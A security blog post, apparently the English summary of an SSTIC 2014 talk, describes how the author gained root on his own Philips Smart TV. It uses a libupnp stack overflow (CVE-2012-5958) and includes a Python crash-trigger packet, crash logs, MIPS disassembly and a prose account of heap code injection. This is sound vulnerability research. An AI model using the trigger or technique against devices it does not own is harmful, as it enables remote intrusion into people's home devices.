
<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>

    <link rel="stylesheet" type="text/css" href="https://www.fredericb.info/theme/stylesheet/style.min.css">

  <link rel="stylesheet" type="text/css" href="https://www.fredericb.info/theme/pygments/github.min.css">
  <link rel="stylesheet" type="text/css" href="https://www.fredericb.info/theme/font-awesome/css/font-awesome.min.css">


    <link href="https://www.fredericb.info/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="fred's notes Atom">


    <link rel="shortcut icon" href="/resources/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/resources/favicon.ico" type="image/x-icon">


  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />


<meta name="author" content="Frédéric" />
<meta name="description" content="This post is a translated summary of the article published for my talk at SSTIC 2014 conference (french). My Philips Smart TV is a Linux box standing there in my living room : that&#39;s a sufficient reason to try to get root. Debug serial port Internet hackers have already discovered a …" />
<meta name="keywords" content="mips, smarttv, libupnp, philips, exploit">

<meta property="og:site_name" content="fred's notes"/>
<meta property="og:title" content="Exploitation of Philips Smart TV"/>
<meta property="og:description" content="This post is a translated summary of the article published for my talk at SSTIC 2014 conference (french). My Philips Smart TV is a Linux box standing there in my living room : that&#39;s a sufficient reason to try to get root. Debug serial port Internet hackers have already discovered a …"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="https://www.fredericb.info/2014/11/exploitation-of-philips-smart-tv.html"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2014-11-13 13:29:00.001000-08:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="https://www.fredericb.info/author/frederic.html">
<meta property="article:section" content="Article"/>
<meta property="article:tag" content="mips"/>
<meta property="article:tag" content="smarttv"/>
<meta property="article:tag" content="libupnp"/>
<meta property="article:tag" content="philips"/>
<meta property="article:tag" content="exploit"/>
<meta property="og:image" content="/resources/sitelogo.jpg">

  <title>fred's notes &ndash; Exploitation of Philips Smart TV</title>

</head>
<body>
  <aside>
    <div>
      <a href="/">
        <img src="/resources/sitelogo.jpg" alt="fred's notes" title="fred's notes">
      </a>
      <h1><a href="/">fred's notes</a></h1>

<p>Security & Stuff</p>
      <nav>
        <ul class="list">
          <li><a href="https://www.fredericb.info/category/advisory.html">Advisory</a></li>
          <li><a href="https://www.fredericb.info/category/article.html">Article</a></li>
          <li><a href="https://www.fredericb.info/category/tool.html">Tool</a></li>
          <li><a href="https://www.fredericb.info/pages/contact.html#contact">Contact</a></li>

        </ul>
      </nav>

      <ul class="social">
        <li><a class="sc-github" href="https://github.com/frederic" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-linkedin" href="https://www.linkedin.com/in/fredericbasse" target="_blank"><i class="fa fa-linkedin"></i></a></li>
        <li><a class="sc-rss" href="/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
      </ul>
    </div>


  </aside>
  <main>

    <nav>
      <a href="https://www.fredericb.info/">    Home
</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://www.fredericb.info/feeds/all.atom.xml">    Atom
</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="exploitation-of-philips-smart-tv">Exploitation of Philips Smart TV</h1>
    <p>
          Posted on Thu 13 November 2014 in <a href="https://www.fredericb.info/category/article.html">Article</a>


    </p>
  </header>


  <div>
    <p><em>This post is a translated summary of the article published for <a href=
"https://www.sstic.org/2014/presentation/securite_des_ordivisions/">
my talk at SSTIC 2014 conference (french)</a>.</em></p>
<p>My Philips Smart TV is a Linux box standing there in my living room : that's a sufficient reason
to try to get root.
<h2 style="text-align: justify;">Debug serial port</h2>
<div style="text-align: justify;">Internet hackers have already
discovered a serial port on the back panel of the TV set.</div>
<table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;">
<tbody>
<tr >
<td class="tr-caption" style="text-align: center;">
<img alt="" src="https://www.fredericb.info/blog/smarttv/uart.jpg" width="256px">
</td>
</tr>
<tr>
<td class="tr-caption" style="text-align: center;">Serial port
(Jack plug)</td>
</tr>
</tbody>
</table>
This port gives a lot of technical information on the system :<br></p>
<div class="highlight"><pre><span></span>Linux version 2.6.28.9-oslinuxR7.5
(root@lxdevenv) (gcc version 4.2.4) #1 Thu Jun 16 23:27:36 CEST 2011
console [early0] enabled
CPU revision is: 00019651 (MIPS 24Kc)
FPU revision is: 01739300
282 MB SDRAM allocated to Linux on MIPS
512 MB total SDRAM size
Endianess : LITTLE
[...]
</pre></div>


<h2>UPnP library identification</h2>

<div style="text-align: justify;">A network scan reports a running
UPnP service. In January 2013, Rapid7 discovered many
vulnerabilities in libupnp library, v1.6.18. To check if the device
is vulnerable, we send a simple UDP packet that can trigger one of
them (CVE-2012-5958):</div>

<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="n">pkt</span> <span class="o">=</span> <span class="s2">&quot;NOTIFY * HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&quot;</span> <span class="o">+</span>\
   <span class="s2">&quot;HOST: 239.255.255.250:1900</span><span class="se">\r\n</span><span class="s2">&quot;</span> <span class="o">+</span>\
   <span class="s2">&quot;USN:uuid:schemas:device:&quot;</span> <span class="o">+</span>\
   <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">512</span> <span class="o">+</span> <span class="s2">&quot;:end</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;239.255.255.250&#39;</span><span class="p">,</span> <span class="mi">1900</span><span class="p">))</span>
</pre></div>


<div style="text-align: justify;">We can see in the console that a
crash occurred:</div>

<div class="highlight"><pre><span></span>03 &lt;2&gt; 001990235 Exception in process 443: SIGSEGV: address not mapped to object
03 &lt;2&gt; 001990235 EPC = 0x41414141
03 &lt;2&gt; 001990235 RA = 0x41414141
</pre></div>


<div style="text-align: justify;">Execution flow has been
redirected to an arbitrary address, so we know this device uses a
vulnerable version of libupnp. Moreover, it indicates there's no
stack-smashing protection.</div>

<div style="text-align: justify;"><br></div>

<div style="text-align: justify;">In these conditions, exploitation
could be easy if we had had access to this binary&nbsp;or loaded
shared libraries.</div>

<div style="text-align: justify;">But it's not the case: firmware
updates are encrypted, and there's no public method to get a shell
on this system, at this time.</div>

<div style="text-align: justify;">Unfortunately, the <a href=
"http://sitsec.net/blog/2013/09/16/jointspace-server-directory-traversal-vulnerability-on-a-philips-6000-series-smart-led-tv/">
path traversal vulnerability found by Martin Schobert</a> is not
present in our firmware.</div>

<h2>Memory mapping discovery</h2>

<div style="text-align: justify;">CVE-2012-5958 is a remote stack
overflow in the "unique_server_name" function. We cross-compile the
same version of libupnp used in the TV set (1.4), for the same
architecture (MIPS32) with the same compiler (GCC 4.2.4).</div>

<div style="text-align: justify;">Then we disassemble the
vulnerable function :</div>

<div class="highlight"><pre><span></span><span class="err">[</span><span class="na">...</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D4C</span>                <span class="no">lw</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x158</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D50</span>                <span class="no">lw</span>      <span class="no">$s3</span><span class="p">,</span> <span class="mi">0x154</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D54</span>                <span class="no">lw</span>      <span class="no">$s2</span><span class="p">,</span> <span class="mi">0x150</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D58</span>                <span class="no">lw</span>      <span class="no">$s1</span><span class="p">,</span> <span class="mi">0x14C</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D5C</span>                <span class="no">lw</span>      <span class="no">$s0</span><span class="p">,</span> <span class="mi">0x148</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D60</span>                <span class="no">jr</span>      <span class="no">$ra</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D64</span>                <span class="no">addiu</span>   <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x160</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">D64</span>  <span class="c"># End of function unique_service_name</span>
</pre></div>


<div style="text-align: justify;">Function epilogue restores 4
registers (plus $ra) before returning to calling function. The
stack overflow allows to overwrite them with almost arbitrary
values (there's a lot of forbidden bytes).</div>

<div style="text-align: justify;"><br></div>

<div style="text-align: justify;">Among functions that call
"unique_server_name", the "ssdp_request_type" function uses
registers $s0 & $s1 right after the call return.</div>

<div class="highlight"><pre><span></span><span class="nl">.text:</span><span class="err">00004</span><span class="nf">DB4</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; unique_service_name</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">00004</span><span class="no">DB8</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$s0</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">DBC</span>                 <span class="no">lw</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x28</span><span class="err">+</span><span class="no">saved_gp</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">DC0</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$s1</span> <span class="c">; arg0</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">00004</span><span class="no">DC4</span>                 <span class="no">la</span>      <span class="no">$t9</span><span class="p">,</span> <span class="mi">0x49C0</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">DC8</span>                 <span class="no">or</span>      <span class="no">$at</span><span class="p">,</span> <span class="no">$zero</span>
<span class="nl">.text:</span><span class="err">00004</span><span class="nf">DCC</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; ssdp_request_type1</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">00004</span><span class="no">DD0</span>                 <span class="no">sw</span>      <span class="no">$zero</span><span class="p">,</span> <span class="mi">8</span><span class="p">(</span><span class="no">$s0</span><span class="p">)</span><span class="c">; write 0 @ $s0+8</span>
</pre></div>


<div style="text-align: justify;">Register $s1 is passed as
parameter to the function "ssdp_request_type1", which reads it as a
string pointer.</div>

<div style="text-align: justify;">Register $s0 is dereferenced to
write the null value.</div>

<div style="text-align: justify;">After that, these registers are
not used anymore until the end of the function where they'll be
restored.</div>

<div style="text-align: justify;"><br></div>

<div style="text-align: justify;">Overwriting saved values of one
of these registers $s0, $s1 and $ra with an arbitrary memory
address can lead to crash the process if this address is not
mapped, or respectively not writable, readable, or
executable.</div>

<div style="text-align: justify;"><br></div>

<div style="text-align: justify;">Crashes can be detected in many
ways:</div>

<ul>
<li style="text-align: justify;">denial of service : the process
doesn't answer anymore to UPnP requests</li>
<li style="text-align: justify;">specific network activity : the
process broadcasts specific packets at startup</li>
<li style="text-align: justify;">crash reports on serial port: from
far the handiest method</li>
</ul>

<div style="text-align: justify;">The observation of process'
behavior allows to deduce if an address is mapped and its
associated permissions.</div>

<div style="text-align: justify;"><br></div>

<div style="text-align: justify;">By repeating this task in an
automated way, it's possible to discover a part of process' memory
mapping :</div>

<div class="highlight"><pre><span></span>0x00402020-0x00532120   r-x
0x00542020-0x0091af20   rw-
0x0091b020-0x00927efc   ---
0x00928020-0x00930920   rw-
0x00942920-0x00980920+  rwx
</pre></div>


<div style="text-align: justify;">Stability of results indicates
that these memory regions are not randomized. We can see that last
one is a variable-sized executable area. We make the hypothesis
this area is the heap.</div>

<h2>Injecting arbitrary code</h2>

<div style="text-align: justify;">We assume that heap is
executable. As libupnp library is open source, we know how UPnP
packets are handled, and which ones are stored in heap
memory.</div>

<div style="text-align: justify;">Thus, we send a custom UPnP
packet to put our arbitrary code at an unknown address in the heap.
No memory corruption involved here.</div>

<h2>Finding arbitrary code location</h2>

<div style="text-align: justify;">As we've already said, this stack
overflow allows to arbitrary modify 4 registers ($s0-3) before
returning from the vulnerable function. Right after,
"ssdp_request_type1" function is called with a single argument $a0
copied from $s1, so we can choose its value.</div>

<div style="text-align: justify;">This function uses its unique
argument as a string pointer and checks if it contains some static
substrings.</div>

<div class="highlight"><pre><span></span><span class="n">enum</span> <span class="n">SsdpSearchType</span> <span class="n">ssdp_request_type1</span><span class="p">(</span> <span class="n">IN</span> <span class="n">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s2">&quot;:all&quot;</span> <span class="p">)</span> <span class="o">!=</span> <span class="n">NULL</span> <span class="p">)</span>
        <span class="k">return</span> <span class="n">SSDP_ALL</span><span class="p">;</span>
    <span class="p">[</span><span class="o">...</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">SSDP_SERROR</span><span class="p">;</span> <span class="p">}</span>
</pre></div>


<p>If at least one static substrings
is found in the string pointer, the UPnP process will respond to
our request. This behavior lets us know if an arbitrary string
pointer contains a specific substring.<br>
<br>
So we put one of these substrings (":all" for example) in our
arbitrary code, and we use this behavior to search its address in
the heap area (we've already discovered heap start address in a
previous section)<br>
As we need to send many UPnP packets and to monitor responses, this
process takes few minutes.</p>
<h2>Remote arbitrary code execution</h2>

<p>We are able to put our arbitrary code in heap memory (executable),
find out its address, and execute it. Thereby, we get shell access
to this system.
We can notice that :<br>
<ul>
<li>all processes are root</li>
<li>stack and heap are executable</li>
<li>stack is not randomized</li>
</ul>
We can also extract <strike>private</strike> public [0] RSA key to
decrypt firmware updates with <a href="https://www.fredericb.info/2014/05/pflupg-tool-unpack-philips-smarttv.html">pflupg-tool</a>.</p>
<hr>
<p>[0] Edit 2014/11/14 : Thanks andreashappe for pointing out this
mistake.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="https://www.fredericb.info/tag/mips.html">mips</a>
      <a href="https://www.fredericb.info/tag/smarttv.html">smarttv</a>
      <a href="https://www.fredericb.info/tag/libupnp.html">libupnp</a>
      <a href="https://www.fredericb.info/tag/philips.html">philips</a>
      <a href="https://www.fredericb.info/tag/exploit.html">exploit</a>
    </p>
  </div>



    <div class="addthis_relatedposts_inline">


</article>

    <footer>
<p>
  &copy;   - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
</p>
<p>    Powered by <a href="http://getpelican.com" target="_blank">Pelican</a> - Theme <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by-sa/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " fred's notes ",
  "url" : "https://www.fredericb.info",
  "image": "/resources/sitelogo.jpg",
  "description": "Frédéric's Thoughts and Writings"
}
</script>

</body>
</html>